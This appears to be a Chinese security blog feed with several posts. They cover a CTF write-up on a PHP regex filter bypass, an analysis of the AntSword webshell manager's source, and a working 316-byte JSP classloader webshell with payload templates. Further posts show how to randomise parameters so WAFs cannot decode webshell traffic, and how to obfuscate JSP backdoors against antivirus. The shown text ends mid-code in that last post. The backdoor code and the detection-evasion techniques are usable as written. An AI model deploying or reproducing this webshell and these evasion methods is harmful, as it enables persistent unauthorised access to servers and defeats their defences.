=== md5($_POST[&apos;b&apos;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;前面md5碰撞已经是老套路了，问题出在后面对shell命令的过滤上。1234if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125;熟悉php代码审计的同学应该都知道，在preg_match中要过滤\ 是需要四个\\\\才可以达到目的，原理如下：123456789101112$str = &apos;\/div&apos;;$pattern = &apos;/\\\\\/div/&apos;;// &apos;\\\\\/&apos; 解析过程如下：// PHP解析：// 第1个&apos;\&apos;转义第2个&apos;\&apos;，转义后为字符串&apos;\&apos;// 第3个&apos;\&apos;转义第4个&apos;\&apos;，转义后为字符串&apos;\&apos;// 第5个&apos;\&apos;转义&apos;/&apos;，转义后为字符串&apos;/&apos;// 字符合起来为&apos;\\/&apos; （则 \\/div 即为正则将要解析的内容，注意：正则解析的内容已经不包括正则标识符//）// 正则解析器解析：// 两个&apos;\\&apos; 正则表达式看做&apos;\&apos; （则正则最终解析为 \/div）$rs = preg_match($pattern, $str, $arr);if($rs) print_r($arr); // Array ( [0] =&gt; \/div )但是出题人似乎觉得不够，又在后面加了四个反斜杠的匹配，似乎本意是要过滤\跟\\？理论来说已经出现了四个\\\\了，但是为什么还会造成非预期ca\t这种解呢？我们本地测试一下去掉其他的乱七八糟的东西，只留下对于反斜杠等的过滤可以看到虽然正则中有\\\\，但是却无法过滤到反斜杠。反向思考其原因，应该是问题出在前面两个反斜杠的匹配部分。因为正则匹配中相当于要经过两层解析器解析，一层是php的，一层是正则表达式的。所以此处前面的两个反斜杠经过php解析器处理后应该是表示了一个转义号\，之后又与后面的表示逻辑或的|结合到一起，从而在正则表达式解析器中解析为\|。又因为|是正则中的保留符号，所以需要一个转义符来转义。所以最后的实现效果应为对于字符|的过滤。所以我们猜测这种写法真正被解析的结果应该是对于字符串|\的过滤，即不是单独的\的匹配。我们来验证一下猜想是否正确：可以看到此时已经触发了正则匹配机制，输出了forbid。所以综上所述：非预期的原因是错误的正则写法匹配了|\，而非预期的\错误的一些说法第一个https://www.cnblogs.com/20175211lyz/p/12189515.html这篇文章中提到反斜杠有这么多种匹配方法，如果你做实验的话发现也确实会输出1234。事实真的是这样吗？随便写个字符串，发现134照样可以匹配到。原因是134条规则都在左右多加了个|，然而|左右为空，也就是说对于任意空字符串都可以匹配，而并非预期的目的。第二个这篇文章的解释是把\t当成tab，这个就更离谱了。https://blog.csdn.net/SopRomeo/article/details/104124545第三个https://www.jianshu.com/p/21e3e1f74c08这个同学自己调试了一番，离真相就差一点啦。最后纸上得来终觉浅，绝知此事要躬行。与君共勉。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中国蚁剑源码分析]]></title>
    <url>%2Fposts%2Fantsword-diy-4%2F</url>
    <content type="text"><![CDATA[前言发现很多同学对于蚁剑的基本流程还有源码结构不太熟悉，所以就有了这一篇比较基础的文章，来讲一讲自己对于蚁剑的一些认识。通过阅读本篇文章，你可以了解蚁剑的源码结构、运行流程、以及自己动手diy时要注意的几个地方。正文目录结构12345678910111213/antData/ 用户目录/modules/ 蚁剑后端模块/node_modules/ 安装的node模块/source/ 核心模块 /base/ 自定义的功能类 /core/ payload模板 /language/ 语言模块 /modules/ 显示模块 /ui/ UI模块 /app.entry.js 渲染程序入口 /load.entry.js 前端加载模块/static/ 静态资源文件/views/ 前端文件其中最核心的是modules目录跟source目录。modules里的内容为蚁剑的后端模块，属于主进程。source中存放着蚁剑运行的核心代码，属于渲染进程。如何debug蚁剑的开发栈主要是：javascript / nodejs / electron。Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。通过Node它提供了通常浏览器所不能提供的能力。简单来说就是chrome里跑nodejs。所以想要对蚁剑二次开发，要首先熟悉一下nodejs的基本语法。electron里面又分主进程跟渲染进程，对于主进程的调试需要用到vscode等，而对于渲染进程只需要用到蚁剑中自带的dev tool就可以。具体可以看这篇文章：https://blog.csdn.net/gary_yan/article/details/78973336一般来说，我们并不需要对modules中的后端模块进行修改，所以一般不会用到主进程调试，仅仅蚁剑中自带的dev tool就可以完成我们日常的调试工作。打开蚁剑-&gt;调试-&gt;开发者工具即可看到调试工具。是不是跟chrome一模一样？其中console用于打印输出日志，蚁剑中默认的日志只会打印前100个字符，如果要查看完整日志需要输入antsword.logs[id]查看，在这里我们直接查看所有日志。我们先连接上本地的shell，然后打印完整日志，就可以看到我们发包的很多参数，包括shell的配置， 编码器设置，字符编码，返回内容等等那么我们在哪里下断点呢答案是在控制台sources-&gt;no domain下面,打开后我们可以看到渲染进程中加载到的各种资源、模块然后我们找到想下断点的文件，就拿php的base64编码器为例，在其10行处点击一下会出现蓝标，就表示下断点成功。此时我们在shell管理界面右键-&gt;刷新目录，就可以看到程序已经断到了我们下断点的地方，在右边可以看到此时的调用栈还有各种变量信息，就可以愉快的调试了。执行流程主程序入口：app.js/source/load.entry.js 前端加载模块/source/app.entry.js 渲染程序入口/source/modules/filemanager/index.js 监听用户操作/source/core/php/template/ 提取组合Payload/source/core/base.js 发送事件与配置到后端request模块解析、回显就按刚才php base64编码器为例，我们看一下蚁剑是如何运行到这一步的。查看上一个调用栈，发现是进入到了编码器处理部分，编码器会接收到三个参数：shell密码、初步payload、还有ext参数。其中ext参数即为shell的配置信息还有rsa对象的组合，这也是为什么我们在写编码器的时候可以直接获取到shell的各种配置信息。再往上看，发现complete函数调用了encodeComplete函数，complete负责将payload套入到模板中，并且设置数据前后分割符，发送给encodeComplete进行处理。再进入到core/base中的request函数，此函数负责将组合完成的数据包发送到后端的request模块。那么是如何触发到这个请求功能的呢，我们直接跳到最开始的点击事件来看。发现是当我们点击刷新目录后，会触发refreshPath函数。然后refreshPath函数分析是否有传递的路径参数，如果没有则为刷新当前目录。然后gotoPath调用了this.manager.getFiles函数。getFiles函数调用this.core.request，第一个参数为this.core.filemanager.dir，即为payload模板中的dir部分。接着组合、发送payload数据包，获取回显并解析。其中解析跟回显部分不是我们关注的重点，我们关注的重点主要是提取组合payload到发送最终数据包的阶段。大家自己调试一下就明白其中的流程了。修改数据包的几个重点位置其中，如果要修改发送的数据包，有三个位置可以供我们参考。\source\core\base.js#187 模板组合（作用对象为全体）\source\core\php\encoder\base64.js 编码器处理（作用于当前类型）\modules\request.js 最终发包（不建议修改）不建议修改后端最终发包是因为蚁剑中后端默认不能获取到所有的opt配置内容，除非自己加，我觉得比较麻烦。配合opt参数实现自定义设置opt参数中有shell的所有配置，通过此项可以做到动态修改数据包的内容。比如说我在基于随机Cookie的蚁剑动态秘钥编码器中就是利用ext.opts.httpConf.headers['Cookie'] = xxx在数据包头部添加了一个cookie作为秘钥在编码器中要用ext.opts.xxx来访问你想要访问的配置内容，在其他地方一般用this.__opts__.xxx或者opts['xxx']即可。最后在实现蚁剑jsp一句话的过程中，我使用了额外传递参数的方式来决定采用什么编码器、什么字符编码等。大家可以看一下我在编码器中的写法。这个方法是挺简单，但是特征也比较明显。那么怎么办呢？相信你读完这篇文章后已经可以试着自己去改掉这个特征，有好的想法欢迎跟我交流。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之实现JSP一句话]]></title>
    <url>%2Fposts%2Fantsword-diy-3%2F</url>
    <content type="text"><![CDATA[前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。蚁剑改造计划之实现动态秘钥编码器解码器蚁剑改造计划之基于随机Cookie的动态秘钥编码器蚁剑改造计划之增加垃圾数据蚁剑改造计划之实现其他参数的随机化正文基本原理由于Java中没有所谓的eval函数，无法对直接传递的代码进行解析执行。所以不管是蚁剑还是菜刀对于JSP的shell一直是采用custom模式，即把要执行的代码提前写在shell中，然后每次只需要传递要调用的函数名以及对应的参数即可。虽然可以实现相应的功能，但是带来一个问题就是shell体积非常巨大。菜刀的jsp脚本有7kb大小，蚁剑的jsp custom脚本即使去掉注释后还有17k之多，用起来非常的不方便。冰蝎的作者rebeyond大佬在文章 利用动态二进制加密实现新型一句话木马之Java篇 中提出了一种新的jsp一句话的实现方式：利用classloader直接解析编译后的class字节码，相当于实现了一个java的eval功能。反复阅读rebeyond大佬的文章，不得不感叹思路的巧妙。自己以前通过类反射+动态加载字节码的方式实现了一个命令执行后门，但是是在shell中获取的输入输出。参数个数也不可控，只能一股脑按最大数传进去，还会有类反射的特征。然而冰蝎是直接重写了Object类的equals方法，并且把pageContext传了进去。熟悉jsp的同学都知道，通过pageContext就可以控制几乎所有的页面对象，也就可以在payload中动态控制输入输出。冰蝎的方法既没有类反射之类的特征，又便于控制输入输出，实在是妙。但是冰蝎很久没更新了，并且暂时没有开源，有些小BUG修改起来非常麻烦。我就想能否把这个功能给移植到蚁剑上。冰蝎的操作是直接用asm框架来修改提前写好的字节码文件，把要传入的参数直接编译进去。由于冰蝎自身就是java写的，所以动态产生字节码具有天生的优势。但是蚁剑的后端是nodejs，这怎么办呢？思路的选择大概有以下三种思路：（1）用nodejs来修改java字节码。（2）写一个专门用来生成payload的jar包，每次执行前调用此jar包，把需要编译的参数通过命令行传入，然后获取回显。（3）在蚁剑中硬编码payload，然后通过getParameter把参数传进去。三种方式各有利弊，第一个想法最简单，但是难度大。超出了本人菜鸟教程上学来的java跟node水平。自己本来是想采用第二个思路，跟yan表哥交流后放弃。就不说用exec调用会不会产生命令注入这种东西，采用第二种方式需要修改蚁剑原有的模式框架，并且还需要配置java环境。而蚁剑从设计之初就是想着能尽量减少对环境的需求。尽管从2.0系列推出加载器后不再需要node环境就可以运行蚁剑，但是目前还是有一堆人连安装蚁剑都有困难。所以在本文中实现的是第三种思路，硬编码payload+其他参数传参。首先根据现成的custom脚本来编写payload，然后把custom的模板给复制一份，把传递的函数名替换成payload即可。采用这种模式的话就跟其他shell发送payload的模式相同，不需要对蚁剑原有的框架进行大改。只不过其他类型传递的是可见的代码，jsp传递的是编译后的字节码。具体实现编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。编译命令1javac -cp &quot;D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar&quot; Test.java保存编译后的class字节码1base64 -w 0 Test.class &gt; Test.txt乱码问题的解决然后是让人头秃的乱码问题。众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。在php版的custom中对于编码是这样处理的：其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。decode函数是对字符串进行解码，比如说base64、hex这种。但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。调试了一下果然会乱码，然后报找不到路径的错误。解决方法就是把两个函数换换位置就好了。换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。原因为什么呢？因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。但是经过测试php类型会正常的根据用户的字符类型来base64编码。emmmm，玄学问题。最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。模板设计Shell模板123456789101112131415161718&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;&lt;%! class U extends ClassLoader&#123; U(ClassLoader c)&#123; super(c); &#125; public Class g(byte []b)&#123; return super.defineClass(b,0,b.length); &#125; &#125; BASE64Decoder decoder=new sun.misc.BASE64Decoder();%&gt;&lt;% String cls=request.getParameter(&quot;ant&quot;); if(cls!=null)&#123; new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。1&lt;%!class U extends ClassLoader&#123; U(ClassLoader c)&#123; super(c); &#125;public Class g(byte []b)&#123; return super.defineClass(b,0,b.length); &#125;&#125;%&gt;&lt;% String cls=request.getParameter(&quot;ant&quot;);if(cls!=null)&#123; new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;Payload模板其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.jsp.PageContext;import java.io.ByteArrayOutputStream;public class Demo &#123; public String encoder; public String cs; @Override public boolean equals(Object obj) &#123; PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(&quot;encoder&quot;)!=null?request.getParameter(&quot;encoder&quot;):&quot;&quot;; cs=request.getParameter(&quot;charset&quot;)!=null?request.getParameter(&quot;charset&quot;):&quot;UTF-8&quot;; StringBuffer output = new StringBuffer(&quot;&quot;); StringBuffer sb = new StringBuffer(&quot;&quot;); try &#123; response.setContentType(&quot;text/html&quot;); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(&quot;var0&quot;)+&quot;&quot;)); String var1 = EC(decode(request.getParameter(&quot;var1&quot;)+&quot;&quot;)); String var2 = EC(decode(request.getParameter(&quot;var2&quot;)+&quot;&quot;)); String var3 = EC(decode(request.getParameter(&quot;var3&quot;)+&quot;&quot;)); output.append(&quot;-&gt;&quot; + &quot;|&quot;); sb.append(func(var1)); output.append(sb.toString()); output.append(&quot;|&quot; + &quot;&lt;-&quot;); page.getOut().print(output.toString()); &#125; catch (Exception e) &#123; sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString()); &#125; return true; &#125; String EC(String s) throws Exception &#123; if(encoder.equals(&quot;hex&quot;)) return s; return new String(s.getBytes(), cs); &#125; String decode(String str) throws Exception&#123; if(encoder.equals(&quot;hex&quot;))&#123; if(str==&quot;null&quot;||str.equals(&quot;null&quot;))&#123; return &quot;&quot;; &#125; String hexString = &quot;0123456789ABCDEF&quot;; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = &quot;&quot;; for (int i = 0; i &lt; str.length(); i += 2)&#123; ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &quot;,&quot;; baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1)))); &#125; return baos.toString(&quot;UTF-8&quot;); &#125;else if(encoder.equals(&quot;base64&quot;))&#123; byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,&quot;UTF-8&quot;); &#125; return str; &#125; String func (String var1)&#123; // Your code &#125;&#125;举个栗子，写一个返回hello+名字的函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.jsp.PageContext;import java.io.ByteArrayOutputStream;public class Test &#123; public String encoder; public String cs; @Override public boolean equals(Object obj) &#123; PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(&quot;encoder&quot;)!=null?request.getParameter(&quot;encoder&quot;):&quot;&quot;; cs=request.getParameter(&quot;charset&quot;)!=null?request.getParameter(&quot;charset&quot;):&quot;UTF-8&quot;; StringBuffer output = new StringBuffer(&quot;&quot;); StringBuffer sb = new StringBuffer(&quot;&quot;); try &#123; response.setContentType(&quot;text/html&quot;); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(&quot;var0&quot;)+&quot;&quot;)); output.append(&quot;-&gt;&quot; + &quot;|&quot;); sb.append(test(var0)); output.append(sb.toString()); output.append(&quot;|&quot; + &quot;&lt;-&quot;); page.getOut().print(output.toString()); &#125; catch (Exception e) &#123; sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString()); &#125; return true; &#125; String EC(String s) throws Exception &#123; if(encoder.equals(&quot;hex&quot;)) return s; return new String(s.getBytes(), cs); &#125; String decode(String str) throws Exception&#123; if(encoder.equals(&quot;hex&quot;))&#123; if(str==&quot;null&quot;||str.equals(&quot;null&quot;))&#123; return &quot;&quot;; &#125; String hexString = &quot;0123456789ABCDEF&quot;; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = &quot;&quot;; for (int i = 0; i &lt; str.length(); i += 2)&#123; ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &quot;,&quot;; baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1)))); &#125; return baos.toString(&quot;UTF-8&quot;); &#125;else if(encoder.equals(&quot;base64&quot;))&#123; byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,&quot;UTF-8&quot;); &#125; return str; &#125; String test(String var0)&#123; return &quot;Hello&quot; + var0; &#125;&#125;将其编译成class文件，base64后输出到Test.txt中再发送payload，其中var0是我们要传入的参数。可以看到屏幕上打印出了Hello yzddmr6默认是明文传递，想要进行base64编码的话将encoder=base64加在请求中即可。如果是手工发送的话要注意：一定要URL编码！！！一定要URL编码！！！一定要URL编码！！！当初忘了给Payload URL编码，一直各种花式报错，卡在这里一天。。。最后在rebeyond大佬提醒下才反应过来。。。我真是个弟弟蚁剑客户端修改在\source\app.entry.js \source\core\index.js \source\modules\settings\encoders.js里增加jsp类型在\source\modules\shellmanager\list\form.js增加对jsp后缀shell类型的识别在base64编码器模板里增加发送的接口，虽然没有实现decoder，但是还是留个接口吧。然后就是用编译后的payload替换原来的函数名实现效果本地每个功能都测试过，也完美支持中文。用起来跟其他类型的shell没有什么区别，四舍五入那就等于没BUG吧~最后有同学可能会问为什么不写回显信息编码函数呢？因为在目前方式下特征太明显了，根本不需要根据回显信息就可以识别。写了后还会导致payload很长，并且还会增加一个decoder=xxx的特征，所以就没加。同时传递的encoder=xxx也没有编码，不管怎么编码都是WAF加一条规则的事情。目前只是处在能用的阶段，无法做到随机变量名等操作，存在很多的硬性特征。在找到有效的解决方法前，本功能可能并不会合并到蚁剑主体中。因为payload实在是太多了，所以我就单独开了一个项目来存放源码：JspForAntSword 如果有什么好的建议欢迎提pr修改后的蚁剑(2.1.x分支)：https://github.com/yzddmr6/antSword/tree/v2.1.x感谢@rebeyond大佬的提醒，同时也感谢@Medici.yan表哥这几天一直跟我交流那么多。深刻的体会到独学则无友。如果有什么写的不对的地方希望师傅们提出，希望大佬们能多带带弟弟QAQ。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之实现其他参数的随机化]]></title>
    <url>%2Fposts%2Fantsword-diy-2%2F</url>
    <content type="text"><![CDATA[前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。蚁剑改造计划之实现动态秘钥编码器解码器蚁剑改造计划之基于随机Cookie的动态秘钥编码器蚁剑改造计划之增加垃圾数据正文历史遗留问题我在前面几篇文章提到过，蚁剑一直有一个硬伤就是它对于其他参数的处理仅仅是一层base64。这就导致了不管怎么对主payload加密，WAF只要分析到其他的参数就能知道你在做什么。例如你在执行cmd的时候，就一定会发送一个经过base64编码的cmd字符串，这就留下了一个被WAF识别的特征。即使是蚁剑编码器仓库中的aes编码器也只是对主payload加了密，防护方在不需要解密主payload的情况下只要看到其他参数传的什么内容就能推测攻击者的行为。yan表哥曾经在公众号中的WAF拦了蚁剑发送的其它参数时怎么操作文章中给出了一种解决方案。主要思想就是在不修改主payload的情况下，配合客户端额外再把它加密解密一遍。可以是可以，但是很麻烦，对于普通的shell不具有适用性。这篇文章的目的就是解决掉这个历史遗留问题。随机化方式的选择想要从根本上解决问题就要修改核心payload，那么怎么改呢？以前师傅们的文章提出过两个方法，一种是把其他参数base64两次，还有一种是在其他参数前面加两个随机字符，然后主payload中再把它给substr截掉，来打乱base64的解码。如果方法是写死的话，无非只是WAF增加两条规则而已。蚁剑这么有名的项目，一定是防火墙商眼中紧盯的目标。最好的解决办法就是加入一个用户可控的参数，能够让用户自定义修改。这样才有可能最大程度的逃过WAF的流量查杀。所以本文采用的方法就是在每个第三方参数前，加入用户自定义长度的随机字符串，来打乱base64的解码。这时，如果WAF不能获得主payload中用户预定义的偏移量，也就无法对其他参数进行解密。此时我们的强加密型编码器才能真正起到作用。具体实现思路1获取用户预定义前缀偏移量-&gt;修改核心payload模版-&gt;给其他参数前增加随机字符串前端的话首先写一个text框，来获取用户的输入在\source\core\base.js中定义randomPrefix变量在\source\modules\settings\adefault.js中设置默认值然后后端就可以通过opts.otherConf[&quot;random-Prefix&quot;]来获取用户定义的随机前缀的长度值。修改模版前要简单了解一下蚁剑对于参数的处理流程在各类型shell的模版文件中，会定义默认的payload以及他们所需要的参数，还有对于参数的编码方式。1source\core\php\template\filemanager.js在获取到模版之后，parseTemplate会对其中的参数进行提取、解析、组合，形成要发送的payload1source\core\base.js所以我们要把用户预定义的前缀偏移量传入到两个地方：（1）核心payload模版（2）其他参数的组合模块在核心payload中，我们将要修改的偏移量用#randomPrefix#进行标记，到parseTemplate函数组合最终数据包的时候将其替换。然后定义一个新类型的编码处理器newbase64，在模板中修改对于参数的处理函数。1234567891011121314/** * 增加随机前缀的base64编码 * @param &#123;String&#125; str 字符串 * @return &#123;String&#125; 编码后的字符串 */ newbase64(str) &#123; let randomString=(length)=&gt;&#123; let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; let result = &apos;&apos;; for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; &#125; return randomString(randomPrefix)+Buffer.from(iconv.encode(Buffer.from(str), encode)).toString(&apos;base64&apos;); &#125;修改后的模板长这个样期间遇到一个小坑，就是无法在format()函数中获取opts的值后来发现蚁剑中是这样写的还特意把原来的new this.format给注释掉换成Base.prototype.format的形式，具体原因我也不知道为什么。如果有知道的师傅麻烦告诉我一下。既然追求刺激，那就贯彻到底，直接把opts传给format函数，然后在format中重新取所需要的变量。测试前缀长度默认为2，可以自行修改，只要不是4的倍数即可(原因自己思考一下)。可以正常使用其中prototype为我们传入的第三方参数的值，在这里是要打开目录的绝对路径1prototype=ojRDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3BocE15QWRtaW4v直接base64解码会是乱码去掉前两位后我们进行解码则可以得到正确的结果。最后偏移两位的效果可能还不是很明显，容易被猜出。但是当前缀长度达到10位以上的时候，就很难分析出最后的结果。对php类型修改后我在本地测试了主要的13个功能，均可以正常使用。但是由于涉及到修改核心payload，等确定没有bug了再改其他的。由于我是在父类Base中修改的编码模块，想修改其他类型的shell只需要照葫芦画瓢改一下对应的模版即可。修改后的项目地址：https://github.com/yzddmr6/antSword/tree/v2.1.x]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]JSP类加载后门]]></title>
    <url>%2Fposts%2Fjsp-classload-backdoor%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebShell免杀之JSP]]></title>
    <url>%2Fposts%2Fwebshell-bypass-jsp%2F</url>
    <content type="text"><![CDATA[前言其他类型的webshell容易免杀的一个主要原因是有eval函数，能够把我们的加密几层后的payload进行解密然后用eval执行，从而绕过杀软的检测。然而由于JSP的语法没有所谓的eval函数，不像php等语言那么灵活，变形困难，所以JSP的免杀马比较少，相关的文章也比较少。能找到的公开文章中，LandGrey大佬的这一篇文章写的非常好，利用Java反射机制和Java类加载机制来构造免杀的JSP后门。但是文章中部分细节仅为一笔带过，对于没有学过JAVA的同学不太友好。并且这篇文章写在冰蝎出现之前，没有对冰蝎JSPshell免杀的相关内容。所以今天这篇文章就跟大家一起分享一下JSP的免杀姿势。基础知识JSP标签在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。1234&lt;%@ %&gt; 页面指令，设定页面属性和特征信息&lt;% %&gt; java代码片段，不能在此声明方法&lt;%! %&gt; java代码声明，声明全局变量或当前页面的方法&lt;%= %&gt; Java表达式JSP中的字符串混淆方式ASCII12String a=new String(new byte[] &#123; 121, 122, 100, 100, 77, 114, 54 &#125;); System.out.println(&quot;ASCII: &quot;+a);HEX123import javax.xml.bind.DatatypeConverter; String b= new String(DatatypeConverter.parseHexBinary(&quot;797a64644d7236&quot;)); System.out.println(&quot;HEX: &quot;+b);BASE64123import sun.misc.BASE64Decoder; String c = new String(new BASE64Decoder().decodeBuffer(&quot;eXpkZE1yNg==&quot;)); System.out.println(&quot;BASE64: &quot;+c);类反射首先要知道为什么免杀需要用到类反射类反射可以把我们想要调用的函数或者类的名字放到一个字符串的位置。此时也就相当于我们实现了php中的变量函数，就可以利用base64编码或者hex编码等来混淆关键函数。例子参考大白话说Java反射使用反射调用对象方法的步骤12345Class clz = Class.forName(&quot;test.Apple&quot;); // 获取类的 Class 对象实例Constructor appleConstructor = clz.getConstructor(); // 根据 Class 对象实例获取 Constructor 对象Object appleObj = appleConstructor.newInstance();// 使用 Constructor 对象的 newInstance 方法获取反射类对象Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class); // 获取方法的 Method 对象setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法如果没有构造函数的情况下就更简单了1234Class clz = Class.forName(&quot;test.Apple&quot;); // 获取类的 Class 对象实例Object appleObj=clz.newInstance();// 直接获得clz类的一个实例化对象Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class); // 获取方法的 Method 对象setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法从图中可以看到，我们用类反射调用了Apple类中的setPrice跟getPrice方法。其实也可以压缩一下写成一行的形式1Class.forName(&quot;test.Apple&quot;).getMethod(&quot;setPrice&quot;, int.class).invoke(Class.forName(&quot;test.Apple&quot;).newInstance(),20);不过当然正常人是不会这么写的。类加载在LandGrey大佬的文章中提到的类加载的意思是将获得Class对象的方式由Class rt= Class.forName(“java.lang.Runtime”); 改成Class rt = ClassLoader.getSystemClassLoader().loadClass(“java.lang.Runtime”);的形式。但是冰蝎作者在利用动态二进制加密实现新型一句话木马之Java篇中对于类加载是直接传送二进制字节码。这也是为什么冰蝎能够实现不到1KB的JSP一句话的原因：冰蝎可以做到动态解析二进制class字节码。学过java的同学应该都知道，java执行代码的时候都要先编译生成.class字节码文件，才能被jvm所执行。那么也就是说，如果我们能够实现任意class文件的加载，也就相当于实现了php中的eval函数。我们就用冰蝎中的例子首先写一个命令执行的类，调一个calc，但是我们不写主函数，也就是说我们先不让他运行。12345678910111213package test;import java.io.IOException;public class calc &#123; @Override public String toString() &#123; try &#123; Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return &quot;OK&quot;; &#125;&#125;在项目里生成之后，在out目录下可以看到编译好的二进制class文件。然后把它base64，保存到文件里，去除多余的换行接着生成一个loader类，用于加载我们的class文件1234567891011121314151617package test;import sun.misc.BASE64Decoder;public class loader &#123; public static class Myloader extends ClassLoader //继承ClassLoader &#123; public Class get(byte[] b) &#123; return super.defineClass(b, 0, b.length); &#125; &#125; public static void main(String[] args) throws Exception &#123; String classStr=&quot;xxxxxxxxxxxxxxxxx&quot;; // class的base64编码 BASE64Decoder code=new sun.misc.BASE64Decoder(); Class result=new Myloader().get(code.decodeBuffer(classStr));//将base64解码成byte数组，并传入t类的get函数 System.out.println(result.newInstance().toString()); 